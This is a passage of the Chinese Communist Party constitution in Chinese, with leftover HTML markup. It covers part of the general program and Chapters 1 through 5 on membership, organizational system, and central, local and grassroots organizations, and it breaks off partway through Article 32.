中国共产党自成立以来，始终把为中国人民谋幸福、为中华民族谋复兴作为自己的初心使命，历经百年奋斗，从根本上改变了中国人民的前途命运，开辟了实现中华民族伟大复兴的正确道路，展示了马克思主义的强大生命力，深刻影响了世界历史进程，锻造了走在时代前列的中国共产党。经过长期实践，积累了坚持党的领导、坚持人民至上、坚持理论创新、坚持独立自主、坚持中国道路、坚持胸怀天下、坚持开拓创新、坚持敢于斗争、坚持统一战线、坚持自我革命的宝贵历史经验，这是党和人民共同创造的精神财富，必须倍加珍惜、长期坚持，并在实践中不断丰富和发展。</p><p>  我国正处于并将长期处于社会主义初级阶段。这是在原本经济文化落后的中国建设社会主义现代化不可逾越的历史阶段，需要上百年的时间。我国的社会主义建设，必须从我国的国情出发，走中国特色社会主义道路，以中国式现代化全面推进中华民族伟大复兴。在现阶段，我国社会的主要矛盾是人民日益增长的美好生活需要和不平衡不充分的发展之间的矛盾。由于国内的因素和国际的影响，阶级斗争还在一定范围内长期存在，在某种条件下还有可能激化，但已经不是主要矛盾。我国社会主义建设的根本任务，是进一步解放生产力，发展生产力，逐步实现社会主义现代化，并且为此而改革生产关系和上层建筑中不适应生产力发展的方面和环节。必须坚持和完善公有制为主体、多种所有制经济共同发展，按劳分配为主体、多种分配方式并存，社会主义市场经济体制等基本经济制度，鼓励一部分地区和一部分人先富起来，逐步实现全体人民共同富裕，在生产发展和社会财富增长的基础上不断满足人民日益增长的美好生活需要，促进人的全面发展。发展是我们党执政兴国的第一要务。必须坚持以人民为中心的发展思想，把握新发展阶段，贯彻创新、协调、绿色、开放、共享的新发展理念，加快构建以国内大循环为主体、国内国际双循环相互促进的新发展格局，推动高质量发展。各项工作都要把有利于发展社会主义社会的生产力，有利于增强社会主义国家的综合国力，有利于提高人民的生活水平，作为总的出发点和检验标准，尊重劳动、尊重知识、尊重人才、尊重创造，做到发展为了人民、发展依靠人民、发展成果由人民共享。必须按照中国特色社会主义事业“五位一体”总体布局和“四个全面”战略布局，统筹推进经济建设、政治建设、文化建设、社会建设、生态文明建设，协调推进全面建设社会主义现代化国家、全面深化改革、全面依法治国、全面从严治党。新时代新征程，经济和社会发展的战略目标是，到二〇三五年基本实现社会主义现代化，到本世纪中叶把我国建成社会主义现代化强国。</p><p>  中国共产党在社会主义初级阶段的基本路线是：领导和团结全国各族人民，以经济建设为中心，坚持四项基本原则，坚持改革开放，自力更生，艰苦创业，为把我国建设成为富强民主文明和谐美丽的社会主义现代化强国而奋斗。</p><p>  中国共产党在领导社会主义事业中，必须坚持以经济建设为中心，其他各项工作都服从和服务于这个中心。要实施科教兴国战略、人才强国战略、创新驱动发展战略、乡村振兴战略、区域协调发展战略、可持续发展战略、军民融合发展战略，充分发挥科学技术作为第一生产力的作用，充分发挥人才作为第一资源的作用，充分发挥创新作为引领发展第一动力的作用，依靠科技进步，提高劳动者素质，促进国民经济更高质量、更有效率、更加公平、更可持续、更为安全发展。</p><p>  坚持社会主义道路、坚持人民民主专政、坚持中国共产党的领导、坚持马克思列宁主义毛泽东思想这四项基本原则，是我们的立国之本。在社会主义现代化建设的整个过程中，必须坚持四项基本原则，反对资产阶级自由化。</p><p>  坚持改革开放，是我们的强国之路。只有改革开放，才能发展中国、发展社会主义、发展马克思主义。要全面深化改革，完善和发展中国特色社会主义制度，推进国家治理体系和治理能力现代化。要从根本上改革束缚生产力发展的经济体制，坚持和完善社会主义市场经济体制；与此相适应，要进行政治体制改革和其他领域的改革。要坚持对外开放的基本国策，吸收和借鉴人类社会创造的一切文明成果。改革开放应当大胆探索，勇于开拓，提高改革决策的科学性，更加注重改革的系统性、整体性、协同性，在实践中开创新路。</p><p>  中国共产党领导人民发展社会主义市场经济。毫不动摇地巩固和发展公有制经济，毫不动摇地鼓励、支持、引导非公有制经济发展。发挥市场在资源配置中的决定性作用，更好发挥政府作用，建立完善的宏观调控体系。统筹城乡发展、区域发展、经济社会发展、人与自然和谐发展、国内发展和对外开放，调整经济结构，转变经济发展方式，推进供给侧结构性改革。促进新型工业化、信息化、城镇化、农业现代化同步发展，建设社会主义新农村，走中国特色新型工业化道路，建设创新型国家和世界科技强国。</p><p>  中国共产党领导人民发展社会主义民主政治。坚持党的领导、人民当家作主、依法治国有机统一，走中国特色社会主义政治发展道路、中国特色社会主义法治道路，扩大社会主义民主，建设中国特色社会主义法治体系，建设社会主义法治国家，巩固人民民主专政，建设社会主义政治文明。坚持和完善人民代表大会制度、中国共产党领导的多党合作和政治协商制度、民族区域自治制度以及基层群众自治制度。发展更加广泛、更加充分、更加健全的全过程人民民主，推进协商民主广泛多层制度化发展，切实保障人民管理国家事务和社会事务、管理经济和文化事业的权利。尊重和保障人权。广开言路，建立健全民主选举、民主协商、民主决策、民主管理、民主监督的制度和程序。完善中国特色社会主义法律体系，加强法律实施工作，实现国家各项工作法治化。</p><p>  中国共产党领导人民发展社会主义先进文化。建设社会主义精神文明，实行依法治国和以德治国相结合，提高全民族的思想道德素质和科学文化素质，为改革开放和社会主义现代化建设提供强大的思想保证、精神动力和智力支持，建设社会主义文化强国。加强社会主义核心价值体系建设，坚持马克思主义指导思想，树立中国特色社会主义共同理想，弘扬以爱国主义为核心的民族精神和以改革创新为核心的时代精神，培育和践行社会主义核心价值观，倡导社会主义荣辱观，增强民族自尊、自信和自强精神，抵御资本主义和封建主义腐朽思想的侵蚀，扫除各种社会丑恶现象，努力使我国人民成为有理想、有道德、有文化、有纪律的人民。对党员要进行共产主义远大理想教育。大力发展教育、科学、文化事业，推动中华优秀传统文化创造性转化、创新性发展，继承革命文化，发展社会主义先进文化，提高国家文化软实力。牢牢掌握意识形态工作领导权，不断巩固马克思主义在意识形态领域的指导地位，巩固全党全国人民团结奋斗的共同思想基础。</p><p>  中国共产党领导人民构建社会主义和谐社会。按照民主法治、公平正义、诚信友爱、充满活力、安定有序、人与自然和谐相处的总要求和共同建设、共同享有的原则，以保障和改善民生为重点，解决好人民最关心、最直接、最现实的利益问题，使发展成果更多更公平惠及全体人民，不断增强人民群众获得感，努力形成全体人民各尽其能、各得其所而又和谐相处的局面。加强和创新社会治理。严格区分和正确处理敌我矛盾和人民内部矛盾这两类不同性质的矛盾。加强社会治安综合治理，依法坚决打击各种危害国家安全和利益、危害社会稳定和经济发展的犯罪活动和犯罪分子，保持社会长期稳定。坚持总体国家安全观，统筹发展和安全，坚决维护国家主权、安全、发展利益。</p><p>  中国共产党领导人民建设社会主义生态文明。树立尊重自然、顺应自然、保护自然的生态文明理念，增强绿水青山就是金山银山的意识，坚持节约资源和保护环境的基本国策，坚持节约优先、保护优先、自然恢复为主的方针，坚持生产发展、生活富裕、生态良好的文明发展道路。着力建设资源节约型、环境友好型社会，实行最严格的生态环境保护制度，形成节约资源和保护环境的空间格局、产业结构、生产方式、生活方式，为人民创造良好生产生活环境，实现中华民族永续发展。</p><p>  中国共产党坚持对人民解放军和其他人民武装力量的绝对领导，贯彻习近平强军思想，加强人民解放军的建设，坚持政治建军、改革强军、科技强军、人才强军、依法治军，建设一支听党指挥、能打胜仗、作风优良的人民军队，把人民军队建设成为世界一流军队，切实保证人民解放军有效履行新时代军队使命任务，充分发挥人民解放军在巩固国防、保卫祖国和参加社会主义现代化建设中的作用。</p><p>  中国共产党维护和发展平等团结互助和谐的社会主义民族关系，积极培养、选拔少数民族干部，帮助少数民族和民族地区发展经济、文化和社会事业，铸牢中华民族共同体意识，实现各民族共同团结奋斗、共同繁荣发展。全面贯彻党的宗教工作基本方针，团结信教群众为经济社会发展作贡献。</p><p>  中国共产党同全国各民族工人、农民、知识分子团结在一起，同各民主党派、无党派人士、各民族的爱国力量团结在一起，进一步发展和壮大由全体社会主义劳动者、社会主义事业的建设者、拥护社会主义的爱国者、拥护祖国统一和致力于中华民族伟大复兴的爱国者组成的最广泛的爱国统一战线。不断加强全国人民包括香港特别行政区同胞、澳门特别行政区同胞、台湾同胞和海外侨胞的团结。全面准确、坚定不移贯彻“一个国家、两种制度”的方针，促进香港、澳门长期繁荣稳定，坚决反对和遏制“台独”，完成祖国统一大业。</p><p>  中国共产党坚持独立自主的和平外交政策，坚持和平发展道路，坚持互利共赢的开放战略，统筹国内国际两个大局，积极发展对外关系，努力为我国的改革开放和现代化建设争取有利的国际环境。在国际事务中，弘扬和平、发展、公平、正义、民主、自由的全人类共同价值，坚持正确义利观，维护我国的独立和主权，反对霸权主义和强权政治，维护世界和平，促进人类进步，推动构建人类命运共同体，推动建设持久和平、普遍安全、共同繁荣、开放包容、清洁美丽的世界。在互相尊重主权和领土完整、互不侵犯、互不干涉内政、平等互利、和平共处五项原则的基础上，发展我国同世界各国的关系。不断发展我国同周边国家的睦邻友好关系，加强同发展中国家的团结与合作。遵循共商共建共享原则，推进“一带一路”建设。按照独立自主、完全平等、互相尊重、互不干涉内部事务的原则，发展我党同各国共产党和其他政党的关系。</p><p>  中国共产党要领导全国各族人民实现第二个百年奋斗目标、实现中华民族伟大复兴的中国梦，必须紧密围绕党的基本路线，坚持和加强党的全面领导，坚持党要管党、全面从严治党，弘扬坚持真理、坚守理想，践行初心、担当使命，不怕牺牲、英勇斗争，对党忠诚、不负人民的伟大建党精神，加强党的长期执政能力建设、先进性和纯洁性建设，以改革创新精神全面推进党的建设新的伟大工程，以党的政治建设为统领，全面推进党的政治建设、思想建设、组织建设、作风建设、纪律建设，把制度建设贯穿其中，深入推进反腐败斗争，全面提高党的建设科学化水平，以伟大自我革命引领伟大社会革命。坚持立党为公、执政为民，发扬党的优良传统和作风，不断提高党的领导水平和执政水平，提高拒腐防变和抵御风险的能力，不断增强自我净化、自我完善、自我革新、自我提高能力，不断增强党的阶级基础和扩大党的群众基础，不断提高党的创造力、凝聚力、战斗力，建设学习型、服务型、创新型的马克思主义执政党，使我们党始终走在时代前列，成为领导全国人民沿着中国特色社会主义道路不断前进的坚强核心。党的建设必须坚决实现以下六项基本要求：</p><p>  第一，坚持党的基本路线。全党要用邓小平理论、“三个代表”重要思想、科学发展观、习近平新时代中国特色社会主义思想和党的基本路线统一思想，统一行动，并且毫不动摇地长期坚持下去。必须把改革开放同四项基本原则统一起来，全面落实党的基本路线，反对一切“左”的和右的错误倾向，要警惕右，但主要是防止“左”。必须提高政治判断力、政治领悟力、政治执行力，增强贯彻落实党的理论和路线方针政策的自觉性和坚定性。</p><p>  第二，坚持解放思想，实事求是，与时俱进，求真务实。党的思想路线是一切从实际出发，理论联系实际，实事求是，在实践中检验真理和发展真理。全党必须坚持这条思想路线，积极探索，大胆试验，开拓创新，创造性地开展工作，不断研究新情况，总结新经验，解决新问题，在实践中丰富和发展马克思主义，推进马克思主义中国化时代化。</p><p>  第三，坚持新时代党的组织路线。全面贯彻习近平新时代中国特色社会主义思想，以组织体系建设为重点，着力培养忠诚干净担当的高素质干部，着力集聚爱国奉献的各方面优秀人才，坚持德才兼备、以德为先、任人唯贤，为坚持和加强党的全面领导、坚持和发展中国特色社会主义提供坚强组织保证。全党必须增强党组织的政治功能和组织功能，培养选拔党和人民需要的好干部，培养和造就大批堪当时代重任的社会主义事业接班人，聚天下英才而用之，从组织上保证党的基本理论、基本路线、基本方略的贯彻落实。</p><p>  第四，坚持全心全意为人民服务。党除了工人阶级和最广大人民群众的利益，没有自己特殊的利益。党在任何时候都把群众利益放在第一位，同群众同甘共苦，保持最密切的联系，坚持权为民所用、情为民所系、利为民所谋，不允许任何党员脱离群众，凌驾于群众之上。我们党的最大政治优势是密切联系群众，党执政后的最大危险是脱离群众。党风问题、党同人民群众联系问题是关系党生死存亡的问题。党在自己的工作中实行群众路线，一切为了群众，一切依靠群众，从群众中来，到群众中去，把党的正确主张变为群众的自觉行动。</p><p>  第五，坚持民主集中制。民主集中制是民主基础上的集中和集中指导下的民主相结合。它既是党的根本组织原则，也是群众路线在党的生活中的运用。必须充分发扬党内民主，尊重党员主体地位，保障党员民主权利，发挥各级党组织和广大党员的积极性创造性。必须实行正确的集中，牢固树立政治意识、大局意识、核心意识、看齐意识，坚定维护以习近平同志为核心的党中央权威和集中统一领导，保证全党的团结统一和行动一致，保证党的决定得到迅速有效的贯彻执行。加强和规范党内政治生活，增强党内政治生活的政治性、时代性、原则性、战斗性，发展积极健康的党内政治文化，营造风清气正的良好政治生态。党在自己的政治生活中正确地开展批评和自我批评，在原则问题上进行思想斗争，坚持真理，修正错误。努力造成又有集中又有民主，又有纪律又有自由，又有统一意志又有个人心情舒畅生动活泼的政治局面。</p><p>  第六，坚持从严管党治党。全面从严治党永远在路上，党的自我革命永远在路上。新形势下，党面临的执政考验、改革开放考验、市场经济考验、外部环境考验是长期的、复杂的、严峻的，精神懈怠危险、能力不足危险、脱离群众危险、消极腐败危险更加尖锐地摆在全党面前。要把严的标准、严的措施贯穿于管党治党全过程和各方面。坚持依规治党、标本兼治，不断健全党内法规体系，坚持把纪律挺在前面，加强组织性纪律性，在党的纪律面前人人平等。强化全面从严治党主体责任和监督责任，加强对党的领导机关和党员领导干部特别是主要领导干部的监督，不断完善党内监督体系。深入推进党风廉政建设和反腐败斗争，以零容忍态度惩治腐败，一体推进不敢腐、不能腐、不想腐。</p><p>  中国共产党的领导是中国特色社会主义最本质的特征，是中国特色社会主义制度的最大优势，党是最高政治领导力量。党政军民学，东西南北中，党是领导一切的。党要适应改革开放和社会主义现代化建设的要求，坚持科学执政、民主执政、依法执政，加强和改善党的领导。党必须按照总揽全局、协调各方的原则，在同级各种组织中发挥领导核心作用。党必须集中精力领导经济建设，组织、协调各方面的力量，同心协力，围绕经济建设开展工作，促进经济社会全面发展。党必须实行民主的科学的决策，制定和执行正确的路线、方针、政策，做好党的组织工作和宣传教育工作，发挥全体党员的先锋模范作用。党必须在宪法和法律的范围内活动。党必须保证国家的立法、司法、行政、监察机关，经济、文化组织和人民团体积极主动地、独立负责地、协调一致地工作。党必须加强对工会、共产主义青年团、妇女联合会等群团组织的领导，使它们保持和增强政治性、先进性、群众性，充分发挥作用。党必须适应形势的发展和情况的变化，完善领导体制，改进领导方式，增强执政能力。共产党员必须同党外群众亲密合作，共同为建设中国特色社会主义而奋斗。</p><h2 id="第一章-党员"><a href="#第一章-党员" class="headerlink" title="第一章 党员"></a>第一章 党员</h2><p>  <strong>第一条</strong>　年满十八岁的中国工人、农民、军人、知识分子和其他社会阶层的先进分子，承认党的纲领和章程，愿意参加党的一个组织并在其中积极工作、执行党的决议和按期交纳党费的，可以申请加入中国共产党。</p><p>  <strong>第二条</strong>　中国共产党党员是中国工人阶级的有共产主义觉悟的先锋战士。</p><p>  中国共产党党员必须全心全意为人民服务，不惜牺牲个人的一切，为实现共产主义奋斗终身。</p><p>  中国共产党党员永远是劳动人民的普通一员。除了法律和政策规定范围内的个人利益和工作职权以外，所有共产党员都不得谋求任何私利和特权。</p><p>  <strong>第三条</strong>　党员必须履行下列义务：</p><p>  （一）认真学习马克思列宁主义、毛泽东思想、邓小平理论、“三个代表”重要思想、科学发展观、习近平新时代中国特色社会主义思想，学习党的路线、方针、政策和决议，学习党的基本知识和党的历史，学习科学、文化、法律和业务知识，努力提高为人民服务的本领。</p><p>  （二）增强“四个意识”、坚定“四个自信”、做到“两个维护”，贯彻执行党的基本路线和各项方针、政策，带头参加改革开放和社会主义现代化建设，带动群众为经济发展和社会进步艰苦奋斗，在生产、工作、学习和社会生活中起先锋模范作用。</p><p>  （三）坚持党和人民的利益高于一切，个人利益服从党和人民的利益，吃苦在前，享受在后，克己奉公，多做贡献。</p><p>  （四）自觉遵守党的纪律，首先是党的政治纪律和政治规矩，模范遵守国家的法律法规，严格保守党和国家的秘密，执行党的决定，服从组织分配，积极完成党的任务。</p><p>  （五）维护党的团结和统一，对党忠诚老实，言行一致，坚决反对一切派别组织和小集团活动，反对阳奉阴违的两面派行为和一切阴谋诡计。</p><p>  （六）切实开展批评和自我批评，勇于揭露和纠正违反党的原则的言行和工作中的缺点、错误，坚决同消极腐败现象作斗争。</p><p>  （七）密切联系群众，向群众宣传党的主张，遇事同群众商量，及时向党反映群众的意见和要求，维护群众的正当利益。</p><p>  （八）发扬社会主义新风尚，带头实践社会主义核心价值观和社会主义荣辱观，提倡共产主义道德，弘扬中华民族传统美德，为了保护国家和人民的利益，在一切困难和危险的时刻挺身而出，英勇斗争，不怕牺牲。</p><p>  <strong>第四条</strong>　党员享有下列权利：</p><p>  （一）参加党的有关会议，阅读党的有关文件，接受党的教育和培训。</p><p>  （二）在党的会议上和党报党刊上，参加关于党的政策问题的讨论。</p><p>  （三）对党的工作提出建议和倡议。</p><p>  （四）在党的会议上有根据地批评党的任何组织和任何党员，向党负责地揭发、检举党的任何组织和任何党员违法乱纪的事实，要求处分违法乱纪的党员，要求罢免或撤换不称职的干部。</p><p>  （五）行使表决权、选举权，有被选举权。</p><p>  （六）在党组织讨论决定对党员的党纪处分或作出鉴定时，本人有权参加和进行申辩，其他党员可以为他作证和辩护。</p><p>  （七）对党的决议和政策如有不同意见，在坚决执行的前提下，可以声明保留，并且可以把自己的意见向党的上级组织直至中央提出。</p><p>  （八）向党的上级组织直至中央提出请求、申诉和控告，并要求有关组织给以负责的答复。</p><p>  党的任何一级组织直至中央都无权剥夺党员的上述权利。</p><p>  <strong>第五条</strong>　发展党员，必须把政治标准放在首位，经过党的支部，坚持个别吸收的原则。</p><p>  申请入党的人，要填写入党志愿书，要有两名正式党员作介绍人，要经过支部大会通过和上级党组织批准，并且经过预备期的考察，才能成为正式党员。</p><p>  介绍人要认真了解申请人的思想、品质、经历和工作表现，向他解释党的纲领和党的章程，说明党员的条件、义务和权利，并向党组织作出负责的报告。</p><p>  党的支部委员会对申请入党的人，要注意征求党内外有关群众的意见，进行严格的审查，认为合格后再提交支部大会讨论。</p><p>  上级党组织在批准申请人入党以前，要派人同他谈话，作进一步的了解，并帮助他提高对党的认识。</p><p>  在特殊情况下，党的中央和省、自治区、直辖市委员会可以直接接收党员。</p><p>  <strong>第六条</strong>　预备党员必须面向党旗进行入党宣誓。誓词如下：我志愿加入中国共产党，拥护党的纲领，遵守党的章程，履行党员义务，执行党的决定，严守党的纪律，保守党的秘密，对党忠诚，积极工作，为共产主义奋斗终身，随时准备为党和人民牺牲一切，永不叛党。</p><p>  <strong>第七条</strong>　预备党员的预备期为一年。党组织对预备党员应当认真教育和考察。</p><p>  预备党员的义务同正式党员一样。预备党员的权利，除了没有表决权、选举权和被选举权以外，也同正式党员一样。</p><p>  预备党员预备期满，党的支部应当及时讨论他能否转为正式党员。认真履行党员义务，具备党员条件的，应当按期转为正式党员；需要继续考察和教育的，可以延长预备期，但不能超过一年；不履行党员义务，不具备党员条件的，应当取消预备党员资格。预备党员转为正式党员，或延长预备期，或取消预备党员资格，都应当经支部大会讨论通过和上级党组织批准。</p><p>  预备党员的预备期，从支部大会通过他为预备党员之日算起。党员的党龄，从预备期满转为正式党员之日算起。</p><p>  <strong>第八条</strong>　每个党员，不论职务高低，都必须编入党的一个支部、小组或其他特定组织，参加党的组织生活，接受党内外群众的监督。党员领导干部还必须参加党委、党组的民主生活会。不允许有任何不参加党的组织生活、不接受党内外群众监督的特殊党员。</p><p>  <strong>第九条</strong>　党员有退党的自由。党员要求退党，应当经支部大会讨论后宣布除名，并报上级党组织备案。</p><p>  党员缺乏革命意志，不履行党员义务，不符合党员条件，党的支部应当对他进行教育，要求他限期改正；经教育仍无转变的，应当劝他退党。劝党员退党，应当经支部大会讨论决定，并报上级党组织批准。如被劝告退党的党员坚持不退，应当提交支部大会讨论，决定把他除名，并报上级党组织批准。</p><p>  党员如果没有正当理由，连续六个月不参加党的组织生活，或不交纳党费，或不做党所分配的工作，就被认为是自行脱党。支部大会应当决定把这样的党员除名，并报上级党组织批准。</p><h2 id="第二章-党的组织制度"><a href="#第二章-党的组织制度" class="headerlink" title="第二章 党的组织制度"></a>第二章 党的组织制度</h2><p>  <strong>第十条</strong>　党是根据自己的纲领和章程，按照民主集中制组织起来的统一整体。党的民主集中制的基本原则是：</p><p>  （一）党员个人服从党的组织，少数服从多数，下级组织服从上级组织，全党各个组织和全体党员服从党的全国代表大会和中央委员会。</p><p>  （二）党的各级领导机关，除它们派出的代表机关和在非党组织中的党组外，都由选举产生。</p><p>  （三）党的最高领导机关，是党的全国代表大会和它所产生的中央委员会。党的地方各级领导机关，是党的地方各级代表大会和它们所产生的委员会。党的各级委员会向同级的代表大会负责并报告工作。</p><p>  （四）党的上级组织要经常听取下级组织和党员群众的意见，及时解决他们提出的问题。党的下级组织既要向上级组织请示和报告工作，又要独立负责地解决自己职责范围内的问题。上下级组织之间要互通情报、互相支持和互相监督。党的各级组织要按规定实行党务公开，使党员对党内事务有更多的了解和参与。</p><p>  （五）党的各级委员会实行集体领导和个人分工负责相结合的制度。凡属重大问题都要按照集体领导、民主集中、个别酝酿、会议决定的原则，由党的委员会集体讨论，作出决定；委员会成员要根据集体的决定和分工，切实履行自己的职责。</p><p>  （六）党禁止任何形式的个人崇拜。要保证党的领导人的活动处于党和人民的监督之下，同时维护一切代表党和人民利益的领导人的威信。</p><p>  <strong>第十一条</strong>　党的各级代表大会的代表和委员会的产生，要体现选举人的意志。选举采用无记名投票的方式。候选人名单要由党组织和选举人充分酝酿讨论。可以直接采用候选人数多于应选人数的差额选举办法进行正式选举。也可以先采用差额选举办法进行预选，产生候选人名单，然后进行正式选举。选举人有了解候选人情况、要求改变候选人、不选任何一个候选人和另选他人的权利。任何组织和个人不得以任何方式强迫选举人选举或不选举某个人。</p><p>  党的地方各级代表大会和基层代表大会的选举，如果发生违反党章的情况，上一级党的委员会在调查核实后，应作出选举无效和采取相应措施的决定，并报再上一级党的委员会审查批准，正式宣布执行。</p><p>  党的各级代表大会代表实行任期制。</p><p>  <strong>第十二条</strong>　党的中央和地方各级委员会在必要时召集代表会议，讨论和决定需要及时解决的重大问题。代表会议代表的名额和产生办法，由召集代表会议的委员会决定。</p><p>  <strong>第十三条</strong>　凡是成立党的新组织，或是撤销党的原有组织，必须由上级党组织决定。</p><p>  在党的地方各级代表大会和基层代表大会闭会期间，上级党的组织认为有必要时，可以调动或者指派下级党组织的负责人。</p><p>  党的中央和地方各级委员会可以派出代表机关。</p><p>  <strong>第十四条</strong>　党的中央和省、自治区、直辖市委员会实行巡视制度，在一届任期内，对所管理的地方、部门、企事业单位党组织实现巡视全覆盖。</p><p>  中央有关部委和国家机关部门党组（党委）根据工作需要，开展巡视工作。</p><p>  党的市（地、州、盟）和县（市、区、旗）委员会建立巡察制度。</p><p>  <strong>第十五条</strong>　党的各级领导机关，对同下级组织有关的重要问题作出决定时，在通常情况下，要征求下级组织的意见。要保证下级组织能够正常行使他们的职权。凡属应由下级组织处理的问题，如无特殊情况，上级领导机关不要干预。</p><p>  <strong>第十六条</strong>　有关全国性的重大政策问题，只有党中央有权作出决定，各部门、各地方的党组织可以向中央提出建议，但不得擅自作出决定和对外发表主张。</p><p>  党的下级组织必须坚决执行上级组织的决定。下级组织如果认为上级组织的决定不符合本地区、本部门的实际情况，可以请求改变；如果上级组织坚持原决定，下级组织必须执行，并不得公开发表不同意见，但有权向再上一级组织报告。</p><p>  党的各级组织的报刊和其他宣传工具，必须宣传党的路线、方针、政策和决议。</p><p>  <strong>第十七条</strong>　党组织讨论决定问题，必须执行少数服从多数的原则。决定重要问题，要进行表决。对于少数人的不同意见，应当认真考虑。如对重要问题发生争论，双方人数接近，除了在紧急情况下必须按多数意见执行外，应当暂缓作出决定，进一步调查研究，交换意见，下次再表决；在特殊情况下，也可将争论情况向上级组织报告，请求裁决。</p><p>  党员个人代表党组织发表重要主张，如果超出党组织已有决定的范围，必须提交所在的党组织讨论决定，或向上级党组织请示。任何党员不论职务高低，都不能个人决定重大问题；如遇紧急情况，必须由个人作出决定时，事后要迅速向党组织报告。不允许任何领导人实行个人专断和把个人凌驾于组织之上。</p><p>  <strong>第十八条</strong>　党的中央、地方和基层组织，都必须重视党的建设，经常讨论和检查党的宣传工作、教育工作、组织工作、纪律检查工作、群众工作、统一战线工作等，注意研究党内外的思想政治状况。</p><h2 id="第三章-党的中央组织"><a href="#第三章-党的中央组织" class="headerlink" title="第三章 党的中央组织"></a>第三章 党的中央组织</h2><p>  <strong>第十九条</strong>　党的全国代表大会每五年举行一次，由中央委员会召集。中央委员会认为有必要，或者有三分之一以上的省一级组织提出要求，全国代表大会可以提前举行；如无非常情况，不得延期举行。</p><p>  全国代表大会代表的名额和选举办法，由中央委员会决定。</p><p>  <strong>第二十条</strong>　党的全国代表大会的职权是：</p><p>  （一）听取和审查中央委员会的报告；</p><p>  （二）审查中央纪律检查委员会的报告；</p><p>  （三）讨论并决定党的重大问题；</p><p>  （四）修改党的章程；</p><p>  （五）选举中央委员会；</p><p>  （六）选举中央纪律检查委员会。</p><p>  <strong>第二十一条</strong>　党的全国代表会议的职权是：讨论和决定重大问题；调整和增选中央委员会、中央纪律检查委员会的部分成员。调整和增选中央委员及候补中央委员的数额，不得超过党的全国代表大会选出的中央委员及候补中央委员各自总数的五分之一。</p><p>  <strong>第二十二条</strong>　党的中央委员会每届任期五年。全国代表大会如提前或延期举行，它的任期相应地改变。中央委员会委员和候补委员必须有五年以上的党龄。中央委员会委员和候补委员的名额，由全国代表大会决定。中央委员会委员出缺，由中央委员会候补委员按照得票多少依次递补。</p><p>  中央委员会全体会议由中央政治局召集，每年至少举行一次。中央政治局向中央委员会全体会议报告工作，接受监督。</p><p>  在全国代表大会闭会期间，中央委员会执行全国代表大会的决议，领导党的全部工作，对外代表中国共产党。</p><p>  <strong>第二十三条</strong>　党的中央政治局、中央政治局常务委员会和中央委员会总书记，由中央委员会全体会议选举。中央委员会总书记必须从中央政治局常务委员会委员中产生。</p><p>  中央政治局和它的常务委员会在中央委员会全体会议闭会期间，行使中央委员会的职权。</p><p>  中央书记处是中央政治局和它的常务委员会的办事机构；成员由中央政治局常务委员会提名，中央委员会全体会议通过。</p><p>  中央委员会总书记负责召集中央政治局会议和中央政治局常务委员会会议，并主持中央书记处的工作。</p><p>  党的中央军事委员会组成人员由中央委员会决定，中央军事委员会实行主席负责制。</p><p>  每届中央委员会产生的中央领导机构和中央领导人，在下届全国代表大会开会期间，继续主持党的经常工作，直到下届中央委员会产生新的中央领导机构和中央领导人为止。</p><p>  <strong>第二十四条</strong>　中国人民解放军的党组织，根据中央委员会的指示进行工作。中央军事委员会负责军队中党的工作和政治工作，对军队中党的组织体制和机构作出规定。</p><h2 id="第四章-党的地方组织"><a href="#第四章-党的地方组织" class="headerlink" title="第四章 党的地方组织"></a>第四章 党的地方组织</h2><p>  <strong>第二十五条</strong>　党的省、自治区、直辖市的代表大会，设区的市和自治州的代表大会，县（旗）、自治县、不设区的市和市辖区的代表大会，每五年举行一次。</p><p>  党的地方各级代表大会由同级党的委员会召集。在特殊情况下，经上一级委员会批准，可以提前或延期举行。</p><p>  党的地方各级代表大会代表的名额和选举办法，由同级党的委员会决定，并报上一级党的委员会批准。</p><p>  <strong>第二十六条</strong>　党的地方各级代表大会的职权是：</p><p>  （一）听取和审查同级委员会的报告；</p><p>  （二）审查同级纪律检查委员会的报告；</p><p>  （三）讨论本地区范围内的重大问题并作出决议；</p><p>  （四）选举同级党的委员会，选举同级党的纪律检查委员会。</p><p>  <strong>第二十七条</strong>　党的省、自治区、直辖市、设区的市和自治州的委员会，每届任期五年。这些委员会的委员和候补委员必须有五年以上的党龄。</p><p>  党的县（旗）、自治县、不设区的市和市辖区的委员会，每届任期五年。这些委员会的委员和候补委员必须有三年以上的党龄。</p><p>  党的地方各级代表大会如提前或延期举行，由它选举的委员会的任期相应地改变。</p><p>  党的地方各级委员会的委员和候补委员的名额，分别由上一级委员会决定。党的地方各级委员会委员出缺，由候补委员按照得票多少依次递补。</p><p>  党的地方各级委员会全体会议，每年至少召开两次。</p><p>  党的地方各级委员会在代表大会闭会期间，执行上级党组织的指示和同级党代表大会的决议，领导本地方的工作，定期向上级党的委员会报告工作。</p><p>  <strong>第二十八条</strong>　党的地方各级委员会全体会议，选举常务委员会和书记、副书记，并报上级党的委员会批准。党的地方各级委员会的常务委员会，在委员会全体会议闭会期间，行使委员会职权；在下届代表大会开会期间，继续主持经常工作，直到新的常务委员会产生为止。</p><p>  党的地方各级委员会的常务委员会定期向委员会全体会议报告工作，接受监督。</p><p>  <strong>第二十九条</strong>　党的地区委员会和相当于地区委员会的组织，是党的省、自治区委员会在几个县、自治县、市范围内派出的代表机关。它根据省、自治区委员会的授权，领导本地区的工作。</p><h2 id="第五章-党的基层组织"><a href="#第五章-党的基层组织" class="headerlink" title="第五章 党的基层组织"></a>第五章 党的基层组织</h2><p>  <strong>第三十条</strong>　企业、农村、机关、学校、医院、科研院所、街道社区、社会组织、人民解放军连队和其他基层单位，凡是有正式党员三人以上的，都应当成立党的基层组织。</p><p>  党的基层组织，根据工作需要和党员人数，经上级党组织批准，分别设立党的基层委员会、总支部委员会、支部委员会。基层委员会由党员大会或代表大会选举产生，总支部委员会和支部委员会由党员大会选举产生，提出委员候选人要广泛征求党员和群众的意见。</p><p>  <strong>第三十一条</strong>　党的基层委员会、总支部委员会、支部委员会每届任期三年至五年。基层委员会、总支部委员会、支部委员会的书记、副书记选举产生后，应报上级党组织批准。</p><p>  <strong>第三十二条</strong>　党的基层组织是党在社会基层组织中的战斗堡垒，是党的全部工作和战斗力的基础。它的基本任务是：</p><p>  （一）宣传和执行党的路线、方针、政策，宣传和执行党中央、上级组织和本组织的决议，充分发挥党员的先锋模范作用，积极创先争优，团结、组织党内外的干部和群众，努力完成本单位所担负的任务。</p><p>  （二）组织党员认真学习马克思列宁主义、毛泽东思想、邓小平理论、“三个代表”重要思想、科学发展观、习近平新时代中国特色社会主义思想，推进“两学一做”学习教育、党史学习教育常态化制度化，学习党的路线、方针、政策和决议，学习党的基本知识，学习科学、文化、法律和业务知识。</p><p>  